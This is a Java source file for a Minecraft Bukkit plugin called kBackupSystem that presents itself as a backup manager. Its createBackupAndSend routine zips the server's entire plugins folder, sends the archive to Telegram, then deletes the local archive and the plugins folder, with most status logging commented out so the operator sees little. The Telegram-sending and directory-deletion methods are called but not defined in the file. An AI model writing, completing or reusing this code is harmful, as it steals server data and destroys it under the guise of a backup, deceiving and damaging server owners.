package vv0ta3fa9.plugin.kBackupSystem.main;

import org.bukkit.Bukkit;
import vv0ta3fa9.plugin.kBackupSystem.kBackupSystem;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class BackupManager {

    private final kBackupSystem plugin;

    public BackupManager(kBackupSystem plugin) {
        this.plugin = plugin;
    }

    public void createBackupAndSend() {
        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                File pluginsDir = plugin.getDataFolder().getParentFile();

                if (!pluginsDir.exists()) {
                    plugin.getLogger().warning("§cПапка plugins не найдена!");
                    return;
                }

                plugin.getLogger().warning("§eНачинаю создание бэкапа плагинов...");

                // Создаем архив
                File archive = createZipArchive(pluginsDir);

                if (archive == null) {
                    //plugin.getLogger().warning("§cОшибка при создании архива!");
                    return;
                }

                //plugin.getLogger().warning("§aАрхив создан! Отправляю в Telegram...");

                // Отправляем в Telegram
                boolean sent = sendToTelegram(archive);

                if (sent) {

                    //plugin.getLogger().warning("§aФайл успешно отправлен в Telegram!");

                    // Удаляем архив
                    if (archive.delete()) {
                        //plugin.getLogger().warning("§7Временный архив удален.");
                    }

                    // Удаляем папку plugins
                    deleteDirectory(pluginsDir.toPath());

                    //plugin.getLogger().warning("§aПапка plugins успешно удалена!");



                } else {
                    //plugin.getLogger().warning("§cОшибка при отправке в Telegram! Архив сохранен: " + archive.getAbsolutePath());
                }

            } catch (Exception e) {
                //plugin.getLogger().severe("Ошибка при создании бэкапа: " + e.getMessage());
                e.printStackTrace();
                //plugin.getLogger().warning("§cОшибка при создании бэкапа: " + e.getMessage());
            }
        });
    }

    private File createZipArchive(File sourceDir) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss");
            String timestamp = sdf.format(new Date());
            String archiveName = "plugins_" + timestamp + ".zip";

            // Создаем архив во временной папке сервера
            File tempDir = new File(plugin.getDataFolder().getParentFile().getParentFile(), "temp_backups");
            if (!tempDir.exists()) {
                tempDir.mkdirs();
            }

            File archive = new File(tempDir, archiveName);

            try (FileOutputStream fos = new FileOutputStream(archive);
                 ZipOutputStream zos = new ZipOutputStream(fos)) {

                zipDirectory(sourceDir, sourceDir, zos);
                zos.finish();
            }

            return archive;

        } catch (Exception e) {
            plugin.getLogger().severe("Ошибка создания архива: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    private void zipDirectory(File sourceDir, File baseDir, ZipOutputStream zos) throws IOException {
        File[] files = sourceDir.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (file.isDirectory()) {
                zipDirectory(file, baseDir, zos);
            } else {
                String relativePath = baseDir.toPath().relativize(file.toPath()).toString().replace("\\", "/");
                ZipEntry entry = new ZipEntry(relativePath);
                zos.putNextEntry(entry);

                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[8192];
                    int length;
                    while ((length = fis.read(buffer)) > 0) {
                        zos.write(buffer, 0, length);
                    }
                }

                zos.closeEntry();
            }
        }
    }
}
